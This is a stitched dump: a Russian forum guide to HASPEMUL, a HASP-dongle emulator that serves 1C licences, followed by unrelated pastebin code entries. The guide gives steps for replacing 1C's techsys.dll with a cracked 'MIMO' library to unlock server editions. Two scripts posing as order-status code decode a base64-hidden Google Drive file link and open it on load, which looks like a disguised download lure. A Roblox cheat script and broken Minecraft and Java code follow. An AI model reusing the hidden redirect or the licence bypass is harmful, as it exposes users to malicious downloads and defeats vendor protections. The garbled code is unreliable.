Менеджер лицензий HASP LM выдаёт клиентские лицензии 1С по сети. Может быть использован для запуска с файловыми базами.
""Использование лицензий"" отображает информацию о подключенном ключе к HASP LM и количестве занятых лицензий.
Через HASP LM могут передаваться:
- 1 ключ из серии ORGL8 (ключи net5, net10, net20, net50, net100)
- 1 ключ из серии ORG8A (net250+ ключ на 300 клиентов)
- 1 ключ из серии ORG8B (net250+ ключ на 500 клиентов)
[B]Ключ в каждой серии выбирается случайный. Дампы, добавленные в USB Redirector, HASP LM не раздает.[/B]

* Информационная таблица отображает только HASP ключи серий 1С. Ошибка [I]'CRITICAL - Error: A HASP with specified passwords was not found'[/I] появляется в случаях, если не найдены HASP ключи серий 1С или используются другими сервисами, т.е. не доступны для HASP LM.

[B]5. VirtualHere & USB Redirector[/B] (соответствующие разделы в Панели управления)
Позволяют пробрасывать USB устройства с ВМ на любой другой компьютер. С помощью данных средств можно прокинуть сами USB-ключи.
В комплекте идут программы-клиенты под Windows.
Особенности:
- [B]VirtualHere[/B] не требуется предварительной настройки на ВМ кроме активации (запускается при первой загрузке).
Лицензия VirtualHere включает пробрасывание до 63 USB-устройств. Все настройки выполняются на стороне клиента.
- [B]USB Redirector[/B] требует предварительно настроить доступ к конкретным USB-устройствам.
Либо включить автоматический доступ, тогда ко всем USB-устройства будет сразу открываться доступ, кроме списка исключения.
[B]К устройствам с открытым доступом закрывается доступ остальных программ, в том числе HASP LM[/B], что удобно
использовать для совместного их использования. Клиент USB Redirector укомплектован ключом на 10 подключений.

Статусы устройств в [B]USB Redirector[/B]:
[B]S[/B] - shared (разрешён доступ)
[B]X[/B] - in exclusion list (исключён)
[B]U[/B] - in use by (используется)
[B]*[/B] т.е. когда устройство проброшено с помощью USB Redirector, будет напротив '[B]U[/B]'

Статусы устройств в [B]VirtualHere[/B]:
[B]R[/B] - используется в USB Redirector
[B]V[/B] - используется в VirtualHere
[B]*[/B] т.е. когда устройство проброшено с помощью VirtualHere, будет напротив '[B]V[/B]'

[B]6. Сетевая папка (SMB)[/B] (соответствующий раздел в Панели управления)
Позволяет управлять сетевой папкой для загрузки дампов и обновлений ВМ.
[B]!! Для доступа к сетевой папке с ОС Windows Server необходимо в настройках ВМ добавить пользователя с тем же
логином и паролем, что и пользователь Windows Server.[/B]

[B]7. Управление памятью[/B] (соответствующий раздел в Панели управления)
Отображает информацию о количестве используемой и свободной оперативной памяти.
Также есть возможность сократить количество используемой оперативной памяти за счет некоторой оптимизации.
Подробнее в инструкции ""Как минимизировать количество используемой оперативной памяти"".

[B]8. В разделе Ещё[/B] управление Файерволом и другими настройками.[/MORE]
[B]Как минимизировать количество используемой оперативной памяти[/B] [MORE=Подробнее][B]Оптимизация используемой оперативной памяти:[/B]
[B]1.[/B] Отключить все неиспользуемые службы
а) Отключить автозагрузку неиспользуемых контейнеров
б) Отключить автозагрузку, если не используются, HASP LM, VirtualHere, USB Redirector. Для запуске 1С на 1 компьютере достаточно только HASP LM.
в) Отключить автозагрузку Samba и отключить Сетевое обнаружение
г) Отключить файервол

[B]2.[/B] Запустить ""Оставить при загрузке только текущие модули устройств"" в разделе ""Оптимизация памяти"" Панели управления
Это позволит убрать лишние драйвера при загрузке ОС, но привяжет ОС к оборудованию ВМ.

[B]3.[/B] а) Запустить ""Использовать сжатие памяти"" в разделе ""Оптимизация памяти"" Панели управления
Это создаст в половине оперативной памяти сжатый кэш.
б) Или дополнительно с помощью команд можно отключить такие службы как sshd, apparmor, cron, rsyslog
# sudo systemctl disable sshd
# sudo systemctl disable apparmor
# sudo systemctl disable cron
# sudo systemctl disable rsyslog

[B]4.[/B] Теперь можно выключить ВМ и изменить количество оперативной памяти в настройках. После данных настроек ВМ на VirtualBox запускается на 64 Мб оперативной памяти и использует около 24 Мб.

[B]5.[/B] Результат налицо
[url=https://i.ibb.co/WFDNNXs/haspemulmem.png][img]https://i.ibb.co/WFDNNXs/haspemulmem.png[/img][/url][/MORE]
[B]Перезапуск HASP License Manager по расписанию[/B] [MORE=Подробнее][B]Перезапуск HASP License Manager по расписанию[/B]

Включить перезапуск HASP LM ежедневно в 0:10
$ echo ""10 0 * * * root systemctl restart hasplm"" | sudo tee /etc/cron.d/hasplm-restart
$ sudo systemctl restart cron

Отключить перезапуск HASP LM
$ sudo rm /etc/cron.d/hasplm-restart
$ sudo systemctl restart cron[/MORE]
[B]Как включить КОРП 1С-сервер/отключить напоминания (Windows)[/B] [MORE=Подробнее][B]Как включить КОРП 1С-сервер/отключить напоминания (Windows)[/B]
1. Остановить службу сервера (для 1С-сервера)
2. Переименовать techsys.dll в папке bin платформы. Например, в t.dll
3. Скопировать в bin techsys.dll от MIMO (v5)
4. Запустить 1С на сервере [B]от имени Администратора[/B]
5. В появившемся окне указать путь к переименованной библиотеке (t.dll) и установить опции HASP 0, КОРП, deLIC, Следы.
[url=https://i.ibb.co/LdGy7mB/mimo5.png][img]https://i.ibb.co/LdGy7mB/mimo5.png[/img][/url]
6. Запустить службу сервера (для 1С-сервера)
Всё должно работать!

[I]* не переименовывайте исходную библиотеку techsys.dll в techsys_N.dll, т.к. наличие этих файлов проверяется 1С[/I]
[I]** на последних версиях используйте mimo 5.2 и выше[/I][/MORE]
[B]Список кодов ошибок HASP License Manager[/B] [MORE=Подробнее][B]Список кодов ошибок HASP License Manager[/B]
[I]Warning=CODE в Журнале поиска ключа 1С[/I]

0 Операция выполнена успешно.
1 Протоколы IPX, NetBIOS или TCP/IP установлены неправильно. Действуй соответственно.
2 Ошибка связи. Не удалось получить номер сокета. Применяется к IPX и TCP/IP. Убедитесь, что протокол установлен правильно.
3 Ошибка связи.
- NetBIOS: невозможно установить сеанс. Убедитесь, что протокол установлен правильно.
- IPX: невозможно получить непосредственный адрес HASP License Manager. Убедитесь, что протокол установлен правильно.
- TCP/IP: невозможно подключиться к серверу. Убедитесь, что адрес сервера указан в INI-файле правильно.
4 HASP License Manager не найден. Проверьте, есть ли у вашего программного обеспечения путь и разрешение на чтение адресного файла.
5 Не удается прочитать адресный файл HASP License Manager.
6 Не удается закрыть адресный файл HASP License Manager.
7 Ошибка связи. Не удалось отправить пакет. Убедитесь, что протокол установлен правильно.
8 Нет ответа от HASP License Manager.IPX - Сеть занята или найдены некорректные адресные файлы. В последнем случае удалите все копии файлов HASPADDR.DAT и NEWHADDR.DAT. NetBIOS — сеть занята. TCP/IP — если используется метод TCP, сеть занята. Если используется метод UDP, то сеть занята или в INI-файле указан неверный адрес.
10 Вы вызвали функцию без предварительного вызова функции входа в систему.
11 Ошибка связи. Ошибка адаптера. Применяется только к NetBIOS. Эта ошибка также может произойти, если протокол NetBIOS не установлен. Убедитесь, что протокол установлен правильно.
15 Активный HASP License Manager не найден.
18 Не удается выполнить вход в сеть HASP, поскольку вызов SetServerByName не был успешным.
19 Синтаксическая ошибка в конфигурационном файле (сервис LastStatus возвращает номер строки, в которой произошла ошибка в Par2).
Если LastStatus возвращает 0 в par2, то либо переменная окружения имеет недопустимое значение, либо IP-адрес не найден (при работе с TCP/IP или UDP для хоста).
20 Ошибка обработки файла конфигурации. Файловая операция, такая как «открыть файл» или «прочитать файл», не удалась. Возможной причиной может быть то, что в системе закончились дескрипторы файлов. Служба LastStatus возвращает код системной ошибки ОС в Par2.
21 Сетевому ключу HASP не удалось выделить память. Эта ошибка уникальна для интерфейсов сетевых ключей HASP для приложений Microsoft Windows и расширителей DOS. Попробуйте освободить память DOS.
22 Сетевому ключу HASP не удалось освободить память. Эта ошибка уникальна для интерфейсов сетевых ключей HASP для приложений Microsoft Windows и расширителей DOS.
23 Неверный адрес памяти сетевого ключа HASP.
25 Не удалось загрузить DLL (winsock.dll или w32sock.dll). Применяется только к TCP/IP или IPX.
26 Не удалось выгрузить библиотеку DLL (winsock.dll или w32sock.dll). Применяется только к TCP/IP или IPX.
28 Ошибка запуска Winsock.dll. Применяется только для TCP/IP.
30 Не удалось закрыть сокет. Применяется только к TCP/IP.
33 Протокол уже установлен. Возвращается только при попытке установить протокол без полного выхода из API.
34 Доступ к ключу запрещен, так как приложение работает на Citrix Winframe или Windows Terminal Server.
129 Правильный сетевой ключ HASP не подключен к HASP License Manager.
130 Указанный номер программы (ProgNum) отсутствует в списке программ памяти ключа HASP.
131 Ошибка чтения из памяти ключа HASP.
132 Ошибка записи в память ключа HASP.
133 Текущий запрос на вход превышает количество станций, на которых может одновременно работать программное обеспечение.
134 Текущий запрос на вход превышает количество авторизованных активаций программного обеспечения.
135 Вы вызвали функцию выхода без предварительного вызова функции входа в систему. Это может произойти, если Менеджер лицензий был перезагружен или вы вышли из Менеджера лицензий.
136 HASP License Manager занят.
137 В списке пользователей сетевого ключа HASP нет места.
138 Количество авторизованных станций превышает максимальное количество, указанное в модели HASP.
139 Вы вызвали функцию без предварительного вызова функции входа в систему.
140 HASP License Manager не обслуживает сеть вашей станции.
141 Недействительная служба или новая версия HASP API обменивается данными со старой версией HASP License Manager.
142 Не удалось найти HASP License Manager с именем, указанным в файле конфигурации HASP.
150 HASP License Manager с присвоенным именем не найден.
151 Обнаружены два или более разных HASP License Manager с назначенным именем.
152 Операция декодирования завершилась неудачно, так как служба не поддерживалась оборудованием.
155 Обнаружена старая версия Менеджера лицензий. Используемый API требовал установки более новой версии License Manager.
157 Размер буфера слишком мал для запрошенной функции.
158 HASP License Manager работает на машине со старым драйвером HASP.
159 HASP License Manager работает на машине без установленного драйвера HASP.[/MORE]
[B]Настройка WireGuard[/B] [MORE=Подробнее][B]Настройка WireGuard[/B]

[U]В режиме сервера[/U]
1. Установить WireGuard, если он не установлен ([I]""Система"" - ""Менеджер пакетов""[/I])
2. Заходим в модуль ""WireGuard"" ([I]в основном меню[/I])
3. Добавляем новый локальный пир ([I]в меню ""Новый""[/I])
4. После создания локального пира заходим в настройки пира ([I]установить курсор на созданный пир и выбрать в меню ""Настройки""[/I]) и заполняем:
   - IP-адрес - это адрес пира внутри VPN
   - Адрес подключения удаленных пиров - это адрес, на который будут стучаться удаленный пиры. Может быть как IP-адрес, так и DNS-имя
   - Порт подключения удаленных пиров - это порт, который будет прослушиваться сервером в ожидании удаленных пиров
5. Переходим к удаленным пирам нашего нового локального пира ([I]установить курсор на созданный пир и выбрать в меню ""Удаленные пиры""[/I])
6. Создаем удаленный пир для каждого подключаемого узла ([I]в меню выбираем ""Новый"", а поле ""Открытый ключ"" оставляем неизменным или пустым[/I])
7. После создания удаленного пира заходим в настройки этого пира ([I]установить курсор на созданный пир и выбрать в меню ""Настройки""[/I]) и заполняем:
   - Имя ([I]не обязательно[/I]) - Имя нужно для более удобного поиска пиров
   - IP-адрес пира - это адрес удаленного пира внутри VPN
   - Проверка активности (сек) - с какой частотой будет осуществляться проверка VPN-соединения
   - Предварительный ключ ([I]не обязательно[/I]) - Ключ дополнительного шифрования с симметричным ключом поверх штатного шифрования с асимметричным ключом
8. Выгружаем конфиг для удаленного пира ([I]установить курсор на созданный пир и выбрать в меню ""Выгрузить конфиг""[/I])
   Файл конфигурации будет сохранен в сетевую папку \\<ip>\ruboard, где <ip> - IP-адрес HASPEMUL
   Этот файл нужно будет импортировать на клиенте WireGuard
9. Возвращаемся в Локальные пиры и Включаем пир ([I]установить курсор на локальный пир и выбрать в меню ""Включить""[/I])
10. Необходимо в Файерволе разрешить подключение к указанному в п.4 порту.
11. Теперь можем подключаться с клиента.

Основное отличие настройки в [U]режиме Клиента[/U] - на шаге 6 нужно заполнить ""Открытый ключ""[/MORE]
[B]Как сделать загрузочный USB/HDD c HASPEMUL, т.е. перенести VHD на физический комп[/B] [url=https://forum.ru-board.com/topic.cgi?forum=35&topic=83057&start=20#12]Подробнее[/url]

[B]Скриншот основного меню программы:[/B]
[#][url=https://i.ibb.co/h2KZPkx/haspemul32new.png][img]https://i.ibb.co/h2KZPkx/haspemul32new.png[/img][/url][/#]
[url=https://i.ibb.co/8jcwq9n/Haspemul32decrease.png][img]https://i.ibb.co/8jcwq9n/Haspemul32decrease.png[/img][/url]

[B]Если не нашли ссылку для скачивания:[/B] [url=topic.cgi?forum=13&topic=2383&glp][b]FAQ по форуму Ru.Board[/b][/url] [См.: • Что означает символ # в некоторых сообщениях? (под ковриком)]
[b][color=#009933]Стандартный пароль для архивов брать тут[/color]: [url=topic.cgi?forum=13&topic=0248&start=1977&limit=1]Выдержка из FAQ по форуму RU.Board[/url][/b]"
qNZ2v4bA,Order.js,dentira,JavaScript,Thursday 17th of April 2025 08:18:24 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/75964/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
CTBVxcgv,"💸$15,000 Glass Bridge (Squid Game Obby) 📈",haidar_at,JavaScript,Thursday 17th of April 2025 08:08:05 AM CDT,"--💸$15,000 Glass Bridge (Squid Game Obby) 📈
--💸$15,000 Glass Bridge (Squid Game Obby) 📈
--💸$15,000 Glass Bridge (Squid Game Obby) 📈
--💸$15,000 Glass Bridge (Squid Game Obby) 📈


local Players = game:GetService(""Players"")
local player = Players.LocalPlayer
local bridge = workspace:WaitForChild(""Bridge"")
local redParts = bridge:WaitForChild(""RedParts"")

-- === Main ScreenGui ===
local screenGui = Instance.new(""ScreenGui"")
screenGui.Name = ""MultiFunctionGui""
screenGui.ResetOnSpawn = false
screenGui.Parent = player:WaitForChild(""PlayerGui"")

-- === Draggable Frame ===
local mainFrame = Instance.new(""Frame"")
mainFrame.Size = UDim2.new(0, 250, 0, 250)
mainFrame.Position = UDim2.new(0, 50, 0, 100)
mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
mainFrame.Active = true
mainFrame.Draggable = true
mainFrame.Parent = screenGui

-- === Frame Style ===
local corner = Instance.new(""UICorner"", mainFrame)
corner.CornerRadius = UDim.new(0, 12)

local stroke = Instance.new(""UIStroke"", mainFrame)
stroke.Color = Color3.fromRGB(255, 255, 255)
stroke.Thickness = 2
stroke.Transparency = 0.5

-- === Header Label ===
local titleLabel = Instance.new(""TextLabel"")
titleLabel.Size = UDim2.new(1, 0, 0, 30)
titleLabel.BackgroundTransparency = 1
titleLabel.Text = ""Menu (Squid Game Obby)📈""
titleLabel.Font = Enum.Font.GothamBold
titleLabel.TextSize = 18
titleLabel.TextColor3 = Color3.new(1, 1, 1)
titleLabel.Parent = mainFrame

-- === Toggle Button ===
local toggleBtn = Instance.new(""TextButton"")
toggleBtn.Size = UDim2.new(1, -20, 0, 40)
toggleBtn.Position = UDim2.new(0, 10, 0, 40)
toggleBtn.Text = ""SHOW PATH ALL""
toggleBtn.BackgroundColor3 = Color3.fromRGB(100, 100, 255)
toggleBtn.TextScaled = true
toggleBtn.TextColor3 = Color3.new(1, 1, 1)
toggleBtn.Font = Enum.Font.GothamSemibold
toggleBtn.Parent = mainFrame

Instance.new(""UICorner"", toggleBtn)
Instance.new(""UIStroke"", toggleBtn).Transparency = 0.3

-- === Teleport Button 1 ===
local teleportBtn = Instance.new(""TextButton"")
teleportBtn.Size = UDim2.new(1, -20, 0, 40)
teleportBtn.Position = UDim2.new(0, 10, 0, 90)
teleportBtn.Text = ""Teleport to END""
teleportBtn.BackgroundColor3 = Color3.fromRGB(255, 100, 100)
teleportBtn.TextScaled = true
teleportBtn.TextColor3 = Color3.new(1, 1, 1)
teleportBtn.Font = Enum.Font.GothamSemibold
teleportBtn.Parent = mainFrame

Instance.new(""UICorner"", teleportBtn)
Instance.new(""UIStroke"", teleportBtn).Transparency = 0.3

-- === Teleport Button 2 ===
local teleportBtn2 = Instance.new(""TextButton"")
teleportBtn2.Size = UDim2.new(1, -20, 0, 40)
teleportBtn2.Position = UDim2.new(0, 10, 0, 140)
teleportBtn2.Text = ""Teleport to Spawn""
teleportBtn2.BackgroundColor3 = Color3.fromRGB(100, 255, 100)
teleportBtn2.TextScaled = true
teleportBtn2.TextColor3 = Color3.new(1, 1, 1)
teleportBtn2.Font = Enum.Font.GothamSemibold
teleportBtn2.Parent = mainFrame

Instance.new(""UICorner"", teleportBtn2)
Instance.new(""UIStroke"", teleportBtn2).Transparency = 0.3

-- === Auto Farm Button ===
local autoFarmBtn = Instance.new(""TextButton"")
autoFarmBtn.Size = UDim2.new(1, -20, 0, 40)
autoFarmBtn.Position = UDim2.new(0, 10, 0, 190)
autoFarmBtn.Text = ""Auto Farm (Off)""
autoFarmBtn.BackgroundColor3 = Color3.fromRGB(255, 200, 100)
autoFarmBtn.TextScaled = true
autoFarmBtn.TextColor3 = Color3.new(1, 1, 1)
autoFarmBtn.Font = Enum.Font.GothamSemibold
autoFarmBtn.Parent = mainFrame

Instance.new(""UICorner"", autoFarmBtn)
Instance.new(""UIStroke"", autoFarmBtn).Transparency = 0.3

-- === Logic ===
local transparencyOn = false
local autoFarmOn = false

local function updateTransparency()
	for _, part in pairs(redParts:GetDescendants()) do
		if part:IsA(""BasePart"") then
			part.Transparency = transparencyOn and 1 or 0
		end
	end
end

toggleBtn.MouseButton1Click:Connect(function()
	transparencyOn = not transparencyOn
	toggleBtn.Text = transparencyOn and ""SHOW PATH (On)"" or ""SHOW PATH (Off)""
	updateTransparency()
end)

-- Auto adjust new red parts
coroutine.wrap(function()
	while true do
		task.wait(0.2)
		if transparencyOn then
			for _, part in pairs(redParts:GetDescendants()) do
				if part:IsA(""BasePart"") and part.Transparency ~= 1 then
					part.Transparency = 1
				end
			end
		end
	end
end)()

-- Teleport Logic
local targetPosition1 = Vector3.new(-2.585143566131592, 10, -1157.951416015625)
local targetPosition2 = Vector3.new(-44.26996612548828, 13.192832946777344, -1142.921875)

autoFarmBtn.MouseButton1Click:Connect(function()
	autoFarmOn = not autoFarmOn
	autoFarmBtn.Text = autoFarmOn and ""Auto Farm (On)"" or ""Auto Farm (Off)""
end)

coroutine.wrap(function()
	while true do
		task.wait(1)
		if autoFarmOn then
			local char = player.Character
			if char and char:FindFirstChild(""HumanoidRootPart"") and char:FindFirstChild(""Humanoid"") then
				char.Humanoid.Sit = true
				char.HumanoidRootPart.CFrame = CFrame.new(targetPosition2)
				task.wait(1)
				char.Humanoid.Sit = true
				char.HumanoidRootPart.CFrame = CFrame.new(targetPosition1)
			end
		end
	end
end)()

teleportBtn.MouseButton1Click:Connect(function()
	local char = player.Character
	if char and char:FindFirstChild(""HumanoidRootPart"") then
		char.HumanoidRootPart.CFrame = CFrame.new(targetPosition1)
	end
end)

teleportBtn2.MouseButton1Click:Connect(function()
	local char = player.Character
	if char and char:FindFirstChild(""HumanoidRootPart"") then
		char.HumanoidRootPart.CFrame = CFrame.new(targetPosition2)
	end
end)"
hPMBVfyQ,farm2.0,Hsiang_Nianian,Lua,Thursday 17th of April 2025 08:05:37 AM CDT,"-- Beni's Smart Turtle Farm Script (Improved by HsiangNianian)
term.clear(); term.setCursorPos(1, 1)
local args = { ... }
local glassColor = args[1] or ""green""
local targetGlassPane = ""minecraft:"" .. glassColor .. ""_stained_glass_pane""
local fuelNeeded = 10
local default_plant = ""ars_nouveau:sourceberry_bush""
local crops = {
    [""minecraft:wheat""] = { seed = ""minecraft:wheat_seeds"", age = 7 },
    [""minecraft:carrots""] = { seed = ""minecraft:carrot"", age = 7 },
    [""minecraft:potatoes""] = { seed = ""minecraft:potato"", age = 7 },
	[""ars_nouveau:magebloom_crop""] = { seed = ""ars_nouveau:magebloom_crop"", age = 7} ,
    [""ars_nouveau:sourceberry_bush""] = { seed = ""ars_nouveau:source_berry"", age = 2 }
}

-- Check startup position (below: water, front: chest, right: chest)
local function validatePosition()
    local downOk, downData = turtle.inspectDown()
    local frontOk, frontData = turtle.inspect()
    turtle.turnRight()
    local rightOk, rightData = turtle.inspect()
    turtle.turnLeft()
    if not (downOk and downData.name == ""minecraft:water"") then return false end
    if not (frontOk and frontData.name == ""minecraft:chest"") then return false end
    if not (rightOk and rightData.name == ""minecraft:chest"") then return false end
    return true
end

-- Refuel if needed
local function checkFuel()
    if turtle.getFuelLevel() < fuelNeeded * 8 then
        turtle.turnRight()
        turtle.suck(fuelNeeded)
        for i = 1, 16 do
            turtle.select(i); turtle.refuel()
        end
        turtle.turnLeft()
    end
end

-- Drop all items in front
local function depositAll()
    for i = 1, 16 do
        turtle.select(i)
        turtle.drop()
    end
end

-- Check if crop is mature
local function isMature(data)
    local crop = crops[data.name]
    return crop and data.state and data.state.age and data.state.age >= crop.age
end

-- Try planting a seed
local function plantCrop(name)
    print('crops: ' .. name)
    local seed = crops[name] and crops[name].seed
    print('seed: '.. seed)
    if not seed then return false end
    for i = 1, 16 do
        local item = turtle.getItemDetail(i)
        if item and item.name == seed then
            turtle.select(i)
            turtle.placeDown()
        end
    end
    return false
end

-- Harvest and replant
local function tryHarvest()
    local ok, data = turtle.inspectDown()
    print(ok)
    if ok and crops[data.name] and isMature(data) then
        turtle.digDown()
        plantCrop(data.name)
    elseif not ok then
        plantCrop(default_plant)
    end
	turtlle.suckDown(64)
end

-- Farming routine (snakes through grid)
local function farmLoop()
    local row = 1
    while true do
        while true do
            tryHarvest()
            local f, data = turtle.inspect()
            if f and (data.name == ""minecraft:glass_pane"") then break end
            turtle.forward()
        end
        if row % 2 == 1 then
            turtle.turnLeft()
            local successCheck, dataCheck = turtle.inspect()
            if successCheck and (dataCheck.name == ""minecraft:glass"" or dataCheck.name == ""minecraft:glass_pane"") then
                break
            else
                turtle.forward()
                turtle.turnLeft()
            end
        else
            turtle.turnRight()
            local successCheck, dataCheck = turtle.inspect()
            if successCheck and (dataCheck.name == ""minecraft:glass"" or dataCheck.name == ""minecraft:glass_pane"") then
                break
            else
                turtle.forward()
                turtle.turnRight()
            end
        end
        row = row + 1
    end
end

-- Return to start (based on row parity)
-- Return to the starting glass pane position
local function returnToStart()
    while true do
        -- Keep moving forward until blocked
        while not turtle.detect() do
			turtle.suckDown(64)
            turtle.forward()
        end

        -- Check if the block in front is the target glass pane
        local ok, data = turtle.inspect()
        print('ok: '.. tostring(ok))
        print('data: '.. data.name)
        if ok and data.name == targetGlassPane then
            print('time to break')
            --return
            break  -- Found the start point, break loop
        end

        -- If not the target, turn left and repeat
        turtle.turnLeft()
    end
end


-- Main routine
while true do
    print(""Starting smart farming cycle..."")
    while not validatePosition() do
        print(""Waiting for correct positioning..."")
        sleep(5)
    end
    checkFuel()
    depositAll()
    if turtle.inspect() then
        turtle.up()
        local ok, data = turtle.inspect()
        if data.name ~= targetGlassPane then
            print(""Wrong glass pane! Expected: "" .. targetGlassPane)
            return
        end
    end
    turtle.turnLeft()
    turtle.forward()

    -- Farming
    farmLoop()
    returnToStart()
    -- turtle.turnRight()
    -- turtle.back()
    turtle.down()
    depositAll()

    print(""Cycle complete. Sleeping before restart..."")
    sleep(60)
end
"
53H4UK4y,HeatProducerCodec Fail,CreativeMasterBonin,Java,Thursday 17th of April 2025 08:05:34 AM CDT,"package net.bcm.cmatd.datagen;

import com.mojang.serialization.Codec;
import com.mojang.serialization.codecs.RecordCodecBuilder;
import net.minecraft.core.registries.BuiltInRegistries;
import net.minecraft.world.level.block.Block;
import net.minecraft.world.level.block.Blocks;
import net.neoforged.neoforge.registries.datamaps.builtin.Compostable;

public record HeatProducers(int heatProduced, boolean turnsIntoAnotherBlock, Block blockToTurnInto, float blockReplacementChance) {
    public static final Codec<HeatProducers> BLOCK_REPLACEMENT_CHANCE = Codec.floatRange(0f, 1f)
            .xmap(HeatProducers::new, HeatProducers::blockReplacementChance);

    public static final Codec<HeatProducers> TURNS_INTO_BLOCK = Codec.BOOL
            .xmap(HeatProducers::new, HeatProducers::turnsIntoAnotherBlock);

    public static final Codec<HeatProducers> HEAT_PRODUCED = Codec.intRange(1,Integer.MAX_VALUE)
            .xmap(HeatProducers::new,HeatProducers::heatProduced);

    public static final Codec<HeatProducers> BLOCK_TO_TURN_INTO = BuiltInRegistries.BLOCK.byNameCodec()
            .xmap(HeatProducers::new, HeatProducers::blockToTurnInto);


    public static final Codec<Compostable> CODEC = Codec.withAlternative(
            RecordCodecBuilder.create(in -> in.group(
                    Codec.intRange(1,Integer.MAX_VALUE).fieldOf(""heat_produced"")
                            .forGetter(HeatProducers::heatProduced).apply(in,HeatProducers::new),
                    Codec.BOOL.fieldOf(""turns_into_another_block"")
                            .forGetter(HeatProducers::turnsIntoAnotherBlock).apply(in,HeatProducers::new),
                    Codec.floatRange(0f, 1f).fieldOf(""block_replacement_chance"")
                            .forGetter(HeatProducers::blockReplacementChance).apply(in,HeatProducers::new),
                    BuiltInRegistries.BLOCK.byNameCodec().fieldOf(""next_oxidation_stage"")
                            .forGetter(HeatProducers::blockToTurnInto).apply(in, HeatProducers::new),
            HEAT_PRODUCED,TURNS_INTO_BLOCK,BLOCK_TO_TURN_INTO,BLOCK_REPLACEMENT_CHANCE)));

    public HeatProducers(){
        this(0,false, Blocks.AIR,0.0f);
    }

    public HeatProducers(int heatProduced){
        this(heatProduced,false,Blocks.AIR,0.0f);
    }

    public HeatProducers(boolean turnsIntoAnotherBlock){
        this(0,turnsIntoAnotherBlock,Blocks.AIR,0.0f);
    }

    public HeatProducers(Block blockToTurnInto){
        this(0,true,blockToTurnInto,0.0f);
    }

    public HeatProducers(float blockReplacementChance){
        this(0,false,Blocks.AIR,blockReplacementChance);
    }
}
"
EQ2kNXMg,Market.js,dentira,JavaScript,Thursday 17th of April 2025 08:03:02 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/67102/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
xS0GfHWY,AI Memry,Ra7eN,Python,Thursday 17th of April 2025 08:00:48 AM CDT,"## FILENAME: ai_memory.py
## Use this in conjunctin with my main.py for open-webui
##
import sqlite3
import os

# Path to the SQLite database
DB_PATH = os.path.join(os.path.dirname(__file__), ""memory.db"")

# Connect to the database (or create it)
def connect_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

# Initialize database and tables
def init_db():
    conn = connect_db()
    cursor = conn.cursor()

    # Table to store people (names, facts)
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS people (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT NOT NULL,
            info TEXT
        )
    ''')

    # Table to store conversations
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS conversations (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_input TEXT,
            ai_response TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')

    # Table to store memory facts
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS memory_facts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            subject TEXT,
            fact TEXT
        )
    ''')

    conn.commit()
    conn.close()

# Save a conversation turn
def save_conversation(user_input, ai_response):
    conn = connect_db()
    cursor = conn.cursor()
    cursor.execute('''
        INSERT INTO conversations (user_input, ai_response)
        VALUES (?, ?)
    ''', (user_input, ai_response))
    conn.commit()
    conn.close()

# Save or update a memory fact
def save_fact(subject, fact):
    conn = connect_db()
    cursor = conn.cursor()
    cursor.execute('DELETE FROM memory_facts WHERE subject = ?', (subject,))
    cursor.execute('INSERT INTO memory_facts (subject, fact) VALUES (?, ?)', (subject, fact))
    conn.commit()
    conn.close()

# Get all memory facts
def get_facts():
    conn = connect_db()
    cursor = conn.cursor()
    cursor.execute('SELECT subject, fact FROM memory_facts')
    rows = cursor.fetchall()
    conn.close()
    return {row['subject']: row['fact'] for row in rows}

# Save a person of importance
def save_person(name, info):
    conn = connect_db()
    cursor = conn.cursor()
    cursor.execute('INSERT INTO people (name, info) VALUES (?, ?)', (name, info))
    conn.commit()
    conn.close()

# Retrieve all saved people
def get_people():
    conn = connect_db()
    cursor = conn.cursor()
    cursor.execute('SELECT name, info FROM people')
    rows = cursor.fetchall()
    conn.close()
    return {row['name']: row['info'] for row in rows}

# Call this once at startup
def initialize():
    init_db()
"
